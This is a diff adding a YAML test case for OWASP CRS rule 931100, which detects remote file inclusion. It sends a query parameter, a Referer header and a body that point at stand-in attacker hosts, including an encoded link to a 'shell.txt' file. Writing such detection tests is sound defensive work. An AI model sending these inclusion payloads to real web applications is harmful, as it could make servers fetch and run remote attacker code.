@@ -1,0 +1,25 @@
+---
+# Hand-written for the importer's tests. Not a copy of an upstream file.
+meta:
+  author: "aegolith bench"
+  description: "remote file inclusion fixture with public hosts"
+rule_id: 931100
+tests:
+  - test_id: 1
+    desc: "public host in the query, a header and the body"
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          port: 80
+          method: "POST"
+          uri: "/post?page=http%3A%2F%2Fattacker.example.com%2Fshell.txt"
+          version: "HTTP/1.1"
+          headers:
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            Accept: "*/*"
+            Referer: "https://attacker.example.org/start"
+          data: "next=http://attacker.example.net/a"
+        output:
+          log:
+            expect_ids: [931100]
